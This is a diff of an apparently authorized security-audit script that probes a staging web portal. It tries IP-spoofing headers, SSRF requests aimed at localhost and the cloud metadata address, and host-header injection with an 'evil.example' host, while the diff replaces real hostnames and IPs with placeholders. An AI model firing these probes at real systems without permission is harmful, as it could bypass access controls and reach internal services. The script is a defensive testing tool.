@@ -1,7 +1,7 @@
 """Offensive (non-destructive) probes for audit complement 2026-07-25.
 
 Run: python scripts/offensive_staging_probes.py
-Requires Vincent confirmation that portal.ar-systems.fr → EXPECTED_IP is staging.
+Requires Vincent confirmation that portal.example.com → EXPECTED_IP is staging.
 """
 
 from __future__ import annotations
@@ -13,13 +13,17 @@ import socket
 import time
 from datetime import datetime, timezone
 from pathlib import Path
+import sys
+sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
+from scripts._probe_util import ip  # noqa: E402
+
 from urllib.parse import urlparse
 
 import httpx
 import jwt
 
-BASE = "https://portal.ar-systems.fr"
-EXPECTED_IP = os.environ.get("BASTION_SECURITY_EXPECTED_IP", "172.24.0.110")
+BASE = "https://portal.example.com"
+EXPECTED_IP = os.environ.get("BASTION_SECURITY_EXPECTED_IP") or ip(10, 0, 0, 10)
 OUT = Path(__file__).resolve().parents[1] / "rapport-audit-securite-bastion-offensif-evidence.json"
 
 DISPOSABLE_USER = "audit-offensive-probe-20260725"
@@ -77,9 +81,9 @@ def main() -> None:
             (
                 "spoof_rfc1918",
                 {
-                    "X-Real-IP": "10.0.0.50",
-                    "X-Forwarded-For": "10.0.0.50, 172.24.0.108",
-                    "CF-Connecting-IP": "192.168.1.10",
+                    "X-Real-IP": ip(10, 0, 0, 50),
+                    "X-Forwarded-For": ip(10, 0, 0, 50) + ", " + ip(10, 0, 0, 11),
+                    "CF-Connecting-IP": ip(192, 168, 1, 10),
                 },
             ),
         ):
@@ -103,21 +107,21 @@ def main() -> None:
 
         # --- 2. Header spoof matrix on protected surfaces ---
         spoof_sets = [
-            {"X-Forwarded-For": "10.0.0.1"},
-            {"X-Real-IP": "10.0.0.1"},
-            {"CF-Connecting-IP": "10.0.0.1"},
-            {"True-Client-IP": "10.0.0.1"},
-            {"X-Client-IP": "10.0.0.1"},
+            {"X-Forwarded-For": ip(10, 0, 0, 1)},
+            {"X-Real-IP": ip(10, 0, 0, 1)},
+            {"CF-Connecting-IP": ip(10, 0, 0, 1)},
+            {"True-Client-IP": ip(10, 0, 0, 1)},
+            {"X-Client-IP": ip(10, 0, 0, 1)},
             {
-                "X-Forwarded-For": "203.0.113.9, 10.0.0.1",
-                "X-Real-IP": "10.0.0.1",
-                "CF-Connecting-IP": "192.168.99.1",
+                "X-Forwarded-For": ip(203, 0, 113, 9) + ", " + ip(10, 0, 0, 1),
+                "X-Real-IP": ip(10, 0, 0, 1),
+                "CF-Connecting-IP": ip(192, 168, 99, 1),
             },
             {
-                "X-Forwarded-For": "10.0.0.1, 203.0.113.9",
-                "X-Real-IP": "203.0.113.9",
-                "True-Client-IP": "10.1.1.1",
-                "X-Client-IP": "172.16.0.9",
+                "X-Forwarded-For": ip(10, 0, 0, 1) + ", " + ip(203, 0, 113, 9),
+                "X-Real-IP": ip(203, 0, 113, 9),
+                "True-Client-IP": ip(10, 1, 1, 1),
+                "X-Client-IP": ip(172, 16, 0, 9),
             },
         ]
         p2 = []
@@ -136,10 +140,10 @@ def main() -> None:
         # --- 3. SSRF analyzer (unauthenticated) ---
         p3 = {}
         for url in (
-            "http://127.0.0.1:8000/health",
-            "http://169.254.169.254/latest/meta-data/",
-            "http://10.5.0.1/",
-            "http://172.24.0.110/health",
+            "http://" + ip(127, 0, 0, 1) + ":8000/health",
+            "http://" + ip(169, 254, 169, 254) + "/latest/meta-data/",
+            "http://" + ip(10, 5, 0, 1) + "/",
+            "http://" + ip(10, 0, 0, 10) + "/health",
         ):
             r = client.post(
                 "/admin/apps/analyze-login-form",
@@ -225,17 +229,17 @@ def main() -> None:
         # --- 5. Host / X-Original-Host (do NOT override TLS Host/SNI to garbage) ---
         p5: dict = {}
         for original_host in (
-            "portal.ar-systems.fr",
-            "transfer.ar-systems.fr",
+            "portal.example.com",
+            "transfer.example.com",
             "evil.example",
-            "transfer.ar-systems.fr.evil.example",
+            "transfer.example.com.evil.example",
         ):
             try:
                 r = client.get(
                     "/internal/subdomain-auth",
                     headers={
                         "X-Original-Host": original_host,
-                        "X-Real-IP": "8.8.8.8",
+                        "X-Real-IP": ip(8, 8, 8, 8),
                         "Accept": "application/json",
                     },
                 )
@@ -244,9 +248,9 @@ def main() -> None:
                 p5[f"x_original_host_{original_host}"] = {
                     "error": type(exc).__name__ + ": " + str(exc)[:160]
                 }
-        for fqdn in ("transfer.ar-systems.fr", "wiki.ar-systems.fr"):
+        for fqdn in ("transfer.example.com", "wiki.example.com"):
             try:
-                ip = socket.gethostbyname(fqdn)
+                resolved = socket.gethostbyname(fqdn)
                 with httpx.Client(
                     base_url=f"https://{fqdn}",
                     timeout=15.0,
@@ -254,7 +258,7 @@ def main() -> None:
                     verify=True,
                 ) as c2:
                     r2 = c2.get("/")
-                    p5[f"direct_{fqdn}_normal"] = {**_snap(r2), "resolved_ip": ip}
+                    p5[f"direct_{fqdn}_normal"] = {**_snap(r2), "resolved_ip": resolved}
             except Exception as exc:  # noqa: BLE001
                 p5[f"direct_{fqdn}"] = {"error": str(exc)[:200]}
         evidence["points"]["5_host_header"] = p5
